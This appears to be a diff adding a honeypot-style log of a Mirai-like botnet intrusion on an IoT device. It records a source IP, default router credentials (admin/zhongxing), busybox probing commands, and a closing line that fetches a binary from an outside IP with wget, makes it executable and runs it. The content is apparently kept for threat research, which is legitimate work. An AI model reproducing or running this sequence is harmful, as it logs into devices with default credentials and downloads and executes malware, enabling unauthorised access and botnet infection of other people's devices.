@@ -1,0 +1,13 @@
+from: 109.105.79.46:40123 user:admin password:zhongxing
+enable
+system
+shell
+sh
+cat /proc/mounts; /bin/busybox UCZVE
+cd /tmp; cat .s || cp /bin/echo .s; /bin/busybox UCZVE
+tftp; wget; /bin/busybox UCZVE
+dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
+/bin/busybox UCZVE
+rm .s; wget http://36.236.79.127:3425/.i; chmod 777 .i; ./.i; exit
+q
+[eof]
